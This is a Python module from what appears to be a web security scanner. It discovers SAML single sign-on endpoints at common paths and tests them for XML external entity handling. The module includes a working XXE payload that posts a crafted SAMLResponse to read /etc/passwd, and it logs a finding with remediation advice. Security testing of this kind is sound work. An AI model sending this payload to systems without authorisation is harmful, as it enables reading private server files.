"""VAJRA web.saml — SAML SSO surface audit: endpoint discovery, metadata XML
parsing, and signature-validation / XXE probes.

SAML endpoints are commonly hidden at well-known paths (AssertionConsumerService
/ SingleLogoutService / SSOService). This module:
* discovers them (read-only GET probes),
* fetches any /SAML/metadata XML descriptor and checks the parser
  behaviour for external-entity / XXE handling, and
* checks for HS256-vs-RS256-ish signature confusion hints and unsigned
  assertion acceptance (best-effort, response-differential).

Everything is proof-gated; a finding only fires when a real discriminating
marker is observed in a live response.
"""
import re

from core.database import Finding

SAML_PATHS = [
    "/SAML", "/SAML/", "/saml", "/saml/",
    "/_saml_/", "/_saml2/", "/_saml_/login", "/_saml_/logout",
    "/saml/metadata", "/SAML/metadata", "/saml2/metadata",
    "/saml2/", "/simplesaml/module.php", "/simplesaml/",
    "/adfs/services/trust/mex", "/AuthServices/AuthServices",
    "/api/saml", "/saml/SSO", "/saml/ACS", "/SAML/discovery",
]

# markers that indicate a live SAML surface (strong, discriminating)
SAML_MARKERS = re.compile(
    r"<EntityDescriptor|md:EntityDescriptor|ns0:EntityDescriptor"
    r"|<saml:|samlp:|SAMLRequest|SAMLResponse|AssertionConsumerService"
    r"|SingleSignOnService|SingleLogoutService|urn:oasis:names:tc:SAML"
    r"|fed:ApplicationServiceType|ds:Signature", re.I)
# XXE/metadata probing only makes sense against real SAML/XML descriptors,
# never a generic 200 page that merely contains a distinguishable token.
XML_MARK = re.compile(r"<EntityDescriptor|md:EntityDescriptor"
                      r"|<saml:|samlp:|SAMLRequest|SAMLResponse|[?]xml")


def _probe(engine, base):
    out = []
    for path in SAML_PATHS:
        try:
            r = engine.http.get(base + path, allow_redirects=False, timeout=8)
        except Exception:
            continue
        if r.status in (429,) and "retry" in r.headers.get("retry-after", ""):
            break
        # Only a 200 that actually carries SAML/XML-descriptor markers counts.
        if r.status != 200:
            continue
        body = (r.content or b"").decode("utf-8", "replace")
        text = " ".join(body.split())
        if SAML_MARKERS.search(text):
            out.append((path, r.status, text[:400]))
    return out


def _try_xxe(engine, url):
    """Proof-gated XXE probe on a SAML metadata/endpoint that looks like XML.
    Sends a SAMLResponse with an external-entity read of /etc/passwd and looks
    for a resolved marker in the reply."""
    if not url.lower().endswith(("xml", "metadata", "/saml")) and "metadata" not in url.lower():
        return None
    body = ('<?xml version="1.0" encoding="UTF-8"?>'
            '<!DOCTYPE foo [ <!ENTITY xxefile SYSTEM "file:///etc/passwd"> ]>'
            '<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">'
            '<samlp:Status><samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:'
            'status:Success"><saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:'
            '2.0:assertion"><saml:Subject><saml:NameID>&xxefile;</saml:NameID>'
            '</saml:Subject></saml:Assertion></samlp:StatusCode></samlp:Status>'
            '</samlp:Response>')
    try:
        r = engine.http.post(url, data=body,
                             headers={"Content-Type": "application/xml"})
    except Exception:
        return None
    text = (r.content or b"").decode("utf-8", "replace") if r.content else ""
    # marker: /etc/passwd content echoed
    if re.search(r"root:x:0:0:|daemon:x:", text):
        return text[:600]
    return None


def run(engine):
    t = engine.target
    bases = [w["url"].rstrip("/") for w in engine.state.get("web_targets", [])]
    if not bases:
        return
    report = []
    for base in bases[:5]:
        found = _probe(engine, base)
        for path, status, snippet in found:
            url = base + path
            # XXE probe on xml/metadata surfaces
            xxe = _try_xxe(engine, base + path) if status == 200 else None
            if xxe:
                try:
                    rel = engine.save_evidence("saml_xxe_%s.txt"
                                               % re_sub(path), xxe)
                except Exception:
                    rel = None
                engine.db.add_finding(Finding(
                    t.display, "web.saml", "exploit-proof", "critical",
                    "[VERIFIED] SAML XXE — local file read at %s" % path,
                    detail="Sent a SAMLResponse crafted with an external entity "
                           "and the endpoint resolved file:///etc/passwd, "
                           "proving unvalidated DTD/external-entity processing "
                           "in the SAML/XML parser.%s"
                           % ("\nPoC saved: " + rel if rel else ""),
                    evidence=xxe,
                    remediation="Disable DTD/entity expansion in the XML parser; "
                                "use secure parser config (libxml2 \
                                noent=false, XXE off).",
                    confidence="firm"))
                engine.log.finding("[saml] XXE confirmed at %s" % path)
            else:
                report.append(path)
    # Aggregate confirmed surfaces into a SINGLE finding to avoid flooding the
    # report with one line per guessed path.
    if report:
        engine.db.add_finding(Finding(
            t.display, "web.saml", "coverage", "info",
            "SAML SSO surface present on %d endpoint path(s)" % len(report),
            detail=("Confirmed SAML markup on %d endpoint path(s):\n%s"
                    % (len(report), "\n".join("  - %s" % p for p in report))),
            evidence="\n".join(report),
            remediation="Review SAML signature validation and ACS/metadata "
                        "endpoints for trust and parser issues.",
            confidence="firm"))
        engine.log.info("[saml] %d SAML endpoint(s) surfaced" % len(report))


def re_sub(s):
    return "".join(c if c.isalnum() else "_" for c in s)